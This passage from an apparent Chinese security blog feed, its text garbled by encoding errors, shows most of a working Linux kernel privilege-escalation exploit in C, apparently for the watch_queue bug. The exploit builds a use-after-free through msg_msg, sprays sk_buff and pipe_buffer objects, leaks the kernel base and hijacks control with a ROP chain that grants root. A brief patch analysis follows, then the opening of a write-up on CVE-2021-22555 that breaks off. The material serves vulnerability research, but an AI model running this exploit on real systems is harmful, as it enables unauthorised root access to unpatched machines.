class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// free the victim secondary msg_msg, then we get a UAF</span><br>    <span class="hljs-keyword">if</span> (readMsg(msqid[real_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.III</span><br><span class="hljs-comment">     * spray sk_buff to leak msg_msg addr</span><br><span class="hljs-comment">     * construct fake msg_msg to leak addr of UAF obj</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff...&quot;</span>);<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// use fake msg_msg to read OOB</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB read from victim msg_msg&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br><br>    nearby_msg = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg-&gt;m_list.prev);<br><br>    <span class="hljs-comment">// release and re-spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-comment">// so that we can make an arbitrary read on a primary msg_msg</span><br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-keyword">sizeof</span>(oob_msg.mtext), <br>            nearby_msg-&gt;m_list.prev - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span>] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    <br>    <span class="hljs-comment">// cal the addr of UAF obj by the header we just read out</span><br>    nearby_msg_prim = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="hljs-number">0x400</span>;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg_prim-&gt;m_list.next);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.IV</span><br><span class="hljs-comment">     * fix the header of UAF obj and release it</span><br><span class="hljs-comment">     * spray pipe_buffer and leak the kernel base</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// re-construct the msg_msg to fix it</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">memset</span>(fake_secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(fake_secondary_msg));<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            victim_addr + <span class="hljs-number">0x800</span>, victim_addr + <span class="hljs-number">0x800</span>, <span class="hljs-comment">// a valid kheap addr is valid</span><br>            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// release UAF obj as secondary msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release UAF obj in message queue...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-comment">// spray pipe_buffer</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create pipe!&quot;</span>);<br>        <br>        <span class="hljs-comment">// write something to activate it</span><br>        <span class="hljs-keyword">if</span> (write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to write the pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// release the sk_buff to read pipe_buffer, leak kernel base</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (read(sk_sockets[i][<span class="hljs-number">1</span>], &amp;fake_secondary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>                errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>            <br>            <span class="hljs-keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="hljs-number">0xffffffff81000000</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, <br>                        pipe_buf_ptr-&gt;ops);<br>                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;<br>                kernel_base = <span class="hljs-number">0xffffffff81000000</span> + kernel_offset;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, <br>            kernel_base, kernel_offset);<br>    <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.V</span><br><span class="hljs-comment">     * hijack the ops of pipe_buffer</span><br><span class="hljs-comment">     * free all pipe to trigger fake ptr</span><br><span class="hljs-comment">     * so that we hijack the RIP</span><br><span class="hljs-comment">     * construct a ROP on pipe_buffer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pre-construct data in userspace...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) fake_secondary_msg;<br>    pipe_buf_ptr-&gt;ops = victim_addr;<br><br>    ops_ptr = (<span class="hljs-keyword">struct</span> pipe_buf_operations *) fake_secondary_msg;<br>    ops_ptr-&gt;release = <span class="hljs-number">0xffffffff8183b4d3</span> + kernel_offset;<span class="hljs-comment">// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret</span><br>    ops_ptr-&gt;confirm = <span class="hljs-number">0xffffffff81689ea4</span> + kernel_offset;<span class="hljs-comment">// pop rdx ; pop r13 ; pop rbp ; ret</span><br><br>    rop_idx = <span class="hljs-number">0</span>;<br>    rop_chain = (<span class="hljs-type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="hljs-number">0x20</span>];<br>    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;<br>    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;<br>    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">22</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = getRootShell;<br>    rop_chain[rop_idx++] = user_cs;<br>    rop_chain[rop_idx++] = user_rflags;<br>    rop_chain[rop_idx++] = user_sp;<br>    rop_chain[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        close(pipe_fd[i][<span class="hljs-number">0</span>]);<br>        close(pipe_fd[i][<span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯å®Œæˆææƒ</p><p><img src="https://s2.loli.net/2022/04/06/Fk975jsZhPfvyCJ.png" alt="image.png"></p><h1>0x03.æ¼æ´ä¿®å¤</h1><p>è¯¥æ¼æ´åœ¨å†…æ ¸ä¸»çº¿çš„ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=93ce93587d36493f2f86921fa79921b3cba63fbb">è¿™ä¸ª commit</a> ä¸­è¢«ä¿®å¤ï¼Œè¿™ä¸ª commit å¢åŠ çš„ä¿®æ”¹æ¯”è¾ƒå¤šï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å¯¹äºè¯¥æ¼æ´å…¶æ”¹å˜çš„éƒ¨åˆ†ï¼š</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-meta">@@ -320,7 +319,7 @@</span> long watch_queue_set_filter(struct pipe_inode_info *pipe,<br>     tf[i].info_mask &amp; WATCH_INFO_LENGTH)<br> goto err_filter;<br> /* Ignore any unknown types */<br><span class="hljs-deletion">-if (tf[i].type &gt;= sizeof(wfilter-&gt;type_filter) * 8)</span><br><span class="hljs-addition">+if (tf[i].type &gt;= WATCH_TYPE__NR)</span><br> continue;<br> nr_filter++;<br> &#125;<br><span class="hljs-meta">@@ -336,7 +335,7 @@</span> long watch_queue_set_filter(struct pipe_inode_info *pipe,<br> <br> q = wfilter-&gt;filters;<br> for (i = 0; i &lt; filter.nr_filters; i++) &#123;<br><span class="hljs-deletion">-if (tf[i].type &gt;= sizeof(wfilter-&gt;type_filter) * BITS_PER_LONG)</span><br><span class="hljs-addition">+if (tf[i].type &gt;= WATCH_TYPE__NR)</span><br> continue;<br> <br> q-&gt;type= tf[i].type;<br></code></pre></td></tr></table></figure><ul><li>ä¿®å¤äº†å‰ååˆ¤å®šä¸ä¸€è‡´çš„é—®é¢˜</li><li>å°† type çš„èŒƒå›´é™å®šä¸º <code>WATCH_TYPE__NR</code>ï¼ˆå€¼ä¸º 2ï¼‰</li></ul><p>ç¬”è€…ä¸ªäººè®¤ä¸ºè¿™ä¸ªä¿®å¤è¿˜æ˜¯æ¯”è¾ƒæˆåŠŸçš„</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æˆ‘åœ¨çœ‹ç€ä½ ğŸ‘_ğŸ‘&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="ææƒ" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>ã€CVE.0x07ã€‘CVE-2021-22555 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ</title>
    <link href="http://blog.arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/"/>
    <id>http://blog.arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/</id>
    <published>2022-03-31T16:18:06.000Z</published>
    <updated>2023-01-12T07:37:02.505Z</updated>
    
    <content type="html"><![CDATA[<p><s>å–·å­æ°¸è¿œæ˜¯ç‰ˆæœ¬ç­”æ¡ˆ</s></p><span id="more"></span><h1>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>CVE-2021-22555 æ˜¯ Linux Netfilter æ¨¡å—ä¸­çš„ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œæ¼æ´ä¸»è¦å‘ç”Ÿåœ¨64 ä½ç³»ç»Ÿä¸Šä¸º 32 ä½è¿›ç¨‹å¤„ç† setsockopt æ—¶ï¼Œè‹¥æŒ‡å®šäº† optname ä¸º <code>IPT_SO_SET_REPLACE</code>ï¼ˆæˆ– <code>IP6T_SO_SET_REPLACE</code>ï¼‰ï¼Œä¸”å¼€å¯äº†å†…æ ¸é€‰é¡¹ <code>CONFIG_USER_NS</code> ã€<code>CONFIG_NET_NS</code>ï¼Œåœ¨å†…æ ¸ç»“æ„è½¬æ¢æ—¶ç”±äºé”™è¯¯è®¡ç®—è½¬æ¢å¤§å°åˆ™ä¼šå¯¼è‡´å†…æ ¸å †ä¸Šçš„è¶Šç•Œå†™å…¥ä¸€äº› 0 å­—èŠ‚ï¼Œä»è€Œè¦†å†™ç›¸é‚» object</p><p>è¯¥æ¼æ´è‡ªå†…æ ¸ç‰ˆæœ¬ <code>v2.6.19-rc1</code> ï¼ˆ<code>9fa492cdc160cd27ce1046cb36f47d3b2b1efa21</code>ï¼‰å¼•å…¥ï¼Œåœ¨è¿™äº›ç‰ˆæœ¬ä¸­è¢«ä¿®å¤ï¼š</p><ul><li><code>5.12 (b29c457a6511435960115c0f548c4360d5f4801d), 5.10.31, 5.4.113, 4.19.188, 4.14.231, 4.9.267, 4.4.267</code></li></ul><p>ç”±äºå…¶å½±å“èŒƒå›´æå¤§ï¼Œä¸”åˆ©ç”¨è¾ƒä¸ºç®€å•ï¼Œæ•…è·å¾—äº† <code>7.8</code> çš„ CVSS è¯„åˆ†</p><p>åœ¨å¼€å§‹åˆ†æä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥è¡¥å……ä¸€äº›å‰ç½®çŸ¥è¯†</p><blockquote><p>æœ¬æ–‡ä¸»è¦å‚è€ƒäº† bsauce å¤§å¸ˆå‚…å¯¹è¯¥æ¼æ´çš„åˆ†æä¸åˆ©ç”¨è¿‡ç¨‹ï¼š<a href="https://www.anquanke.com/post/id/254027">https://www.anquanke.com/post/id/254027</a></p><p>æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„å†…æ ¸æºç ä¸º <code>5.8</code> ç‰ˆæœ¬</p></blockquote><h2 id="å†…æ ¸ç¼–è¯‘é€‰é¡¹"><em>å†…æ ¸ç¼–è¯‘é€‰é¡¹</em></h2><p>é¦–å…ˆæ˜¯æ‰€æœ‰ <code>CONFIG_IP_NF_**</code> å’Œ <code>CONFIG_NETFILTER_**</code> ç›¸å…³çš„é€‰é¡¹éƒ½è¦æ‰“å¼€</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs makefile">CONFIG_IP_NF_IPTABLES=y<br>CONFIG_IP_NF_MATCH_AH=y<br>CONFIG_IP_NF_MATCH_ECN=y<br>CONFIG_IP_NF_MATCH_RPFILTER=y<br>CONFIG_IP_NF_MATCH_TTL=y<br>CONFIG_IP_NF_FILTER=y<br>CONFIG_IP_NF_TARGET_REJECT=y<br>CONFIG_IP_NF_TARGET_SYNPROXY=y<br>CONFIG_IP_NF_NAT=y<br>CONFIG_IP_NF_TARGET_MASQUERADE=y<br>CONFIG_IP_NF_TARGET_NETMAP=y<br>CONFIG_IP_NF_TARGET_REDIRECT=y<br>CONFIG_IP_NF_MANGLE=y<br>CONFIG_IP_NF_TARGET_CLUSTERIP=y<br>CONFIG_IP_NF_TARGET_ECN=y<br>CONFIG_IP_NF_TARGET_TTL=y<br>CONFIG_IP_NF_RAW=y<br>CONFIG_IP_NF_SECURITY=y<br>CONFIG_IP_NF_ARPTABLES=y<br>CONFIG_IP_NF_ARPFILTER=y<br>CONFIG_IP_NF_ARP_MANGLE=y<br><br>CONFIG_NETFILTER=y<br>CONFIG_NETFILTER_ADVANCED=y<br><br>CONFIG_NETFILTER_INGRESS=y<br>CONFIG_NETFILTER_NETLINK=y<br>CONFIG_NETFILTER_FAMILY_BRIDGE=y<br>CONFIG_NETFILTER_FAMILY_ARP=y<br>CONFIG_NETFILTER_NETLINK_ACCT=y<br>CONFIG_NETFILTER_NETLINK_QUEUE=y<br>CONFIG_NETFILTER_NETLINK_LOG=y<br>CONFIG_NETFILTER_NETLINK_OSF=y<br><br>CONFIG_NETFILTER_CONNCOUNT=y<br><br>CONFIG_NETFILTER_NETLINK_GLUE_CT=y<br><br>CONFIG_NETFILTER_SYNPROXY=y<br><br>CONFIG_NETFILTER_XTABLES=y<br><br>CONFIG_NETFILTER_XT_MARK=y<br>CONFIG_NETFILTER_XT_CONNMARK=y<br>CONFIG_NETFILTER_XT_SET=y<br><br>CONFIG_NETFILTER_XT_MATCH_U32=y<br><span class="hljs-comment"># æŒºå¤šçš„ï¼Œè¿™é‡Œç¬”è€…å°±ä¸ä¸€ä¸€æ‘˜å½•äº†</span><br></code></pre></td></tr></table></figure><p>ä»¥åŠä¸‰ä¸ªå…¶ä»–é€‰é¡¹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile">CONFIG_USER_NS=y<br>CONFIG_NET_NS=y<br>CONFIG_COMPAT=y<br></code></pre></td></tr></table></figure><h2 id="Netfilter">Netfilter</h2><p>Netfilter ä¸º Linux å†…æ ¸ä¸­çš„ä¸€ä¸ªå­æ¨¡å—ï¼Œç”¨ä»¥æä¾›æ•°æ®åŒ…è¿‡æ»¤ã€ç½‘ç»œåœ°å€è½¬æ¢ã€ç«¯å£è½¬æ¢ç­‰åŠŸèƒ½ï¼Œå…¶æ•´ä½“æ¡†æ¶å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="https://s2.loli.net/2022/03/28/SFpO9z7YRykLnqU.png" alt="Netfilter components"></p><p>ä¾‹å¦‚ <code>iptables</code> ç­‰å·¥å…·ä¾¿æ˜¯åˆ©ç”¨ Netfilter æ‰€æä¾›çš„æ¥å£å®ç°çš„ï¼Œä¸è¿‡æœ¬ç¯‡æˆ‘ä»¬ä¸»è¦å…³æ³¨å…¶åœ¨å†…æ ¸ä¸­çš„éƒ¨åˆ†</p><p>Netfilter æ¶µç›–äº†å†…æ ¸ç½‘ç»œåè®®æ ˆçš„å¤šå±‚ï¼Œä¸€ä¸ªæ•°æ®åŒ…åœ¨ Netfilter ä¸­çš„å†ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/03/28/8UnfDE7Mry1uhgW.png" alt="image.png"></p><p>åœ¨ Netfilter ä¸­æœ‰ä¸€ç§åä¸º ã€Œtableã€ çš„ç»“æ„ï¼Œç”¨ä»¥å­˜å‚¨ä¸åŒåŠŸèƒ½çš„é…ç½®ä¿¡æ¯ï¼Œåœ¨å†…æ ¸å½“ä¸­ä½¿ç”¨ <code>xt_table</code> ç»“æ„è¡¨ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Furniture shopping... */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_table</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br><br><span class="hljs-comment">/* What hooks you will enter on */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> valid_hooks;<br><br><span class="hljs-comment">/* Man behind the curtain... */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_table_info</span> *<span class="hljs-title">private</span>;</span><br><br><span class="hljs-comment">/* Set this to THIS_MODULE if you are a module, otherwise NULL */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">module</span> *<span class="hljs-title">me</span>;</span><br><br><span class="hljs-type">u_int8_t</span> af;<span class="hljs-comment">/* address/protocol family */</span><br><span class="hljs-type">int</span> priority;<span class="hljs-comment">/* hook order */</span><br><br><span class="hljs-comment">/* called when table is needed in the given netns */</span><br><span class="hljs-type">int</span> (*table_init)(<span class="hljs-keyword">struct</span> net *net);<br><br><span class="hljs-comment">/* A unique name... */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> name[XT_TABLE_MAXNAMELEN];<br>&#125;;<br></code></pre></td></tr></table></figure><p>è¯¥ç»“æ„å…¶å®æ˜¯ä¸€å±‚ wrapperï¼Œå…¶æ ¸å¿ƒç»“æ„ä¸º <code>xt_table_info</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* The table itself */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_table_info</span> &#123;</span><br><span class="hljs-comment">/* Size per table */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<br><span class="hljs-comment">/* Number of entries: FIXME. --RR */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> number;<br><span class="hljs-comment">/* Initial number of entries. Needed for module usage count */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> initial_entries;<br><br><span class="hljs-comment">/* Entry points and underflows */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hook_entry[NF_INET_NUMHOOKS];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> underflow[NF_INET_NUMHOOKS];<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Number of user chains. Since tables cannot have loops, at most</span><br><span class="hljs-comment"> * @stacksize jumps (number of 